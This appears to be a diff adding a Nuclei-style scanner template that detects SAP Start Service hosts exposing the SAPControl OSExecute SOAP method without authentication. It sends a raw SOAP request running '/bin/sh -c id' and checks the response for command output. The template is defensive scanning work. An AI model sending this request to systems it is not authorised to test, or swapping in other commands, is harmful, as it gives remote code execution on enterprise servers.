@@ -1,0 +1,58 @@
+id: sap-osexecute-rce
+
+info:
+  name: SAPControl OSExecute - Remote Code Execution (RCE)
+  author: LRVT,l4rm4nd
+  severity: critical
+  description: |
+    Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the OSExecute web method without authentication.
+  reference:
+    - https://sapdotbasis.wordpress.com/2019/08/08/sapcontrol-command/
+    - https://itsiti.com/csmon/
+    - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362959700.html
+    - https://docs.avantra.com/api/latest/js/sap-control.html
+    - https://www.slideshare.net/slideshow/sap-insecurity-scrubbing-sap-clean-with-soap/9951290
+  metadata:
+    max-request: 1
+  tags: misconfig,sap,sapcontrol,soap,rce,osexecute
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=UTF-8
+        SOAPAction: '""'
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
+          <SOAP-ENV:Header>
+            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
+              <enableSession>true</enableSession>
+            </sapsess:Session>
+          </SOAP-ENV:Header>
+          <SOAP-ENV:Body>
+            <ns1:OSExecute xmlns:ns1="urn:SAPControl">
+              <command>/bin/sh -c id</command>
+              <async>0</async>
+            </ns1:OSExecute>
+          </SOAP-ENV:Body>
+        </SOAP-ENV:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "OSExecuteResponse"
+          - "<output>"
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\("
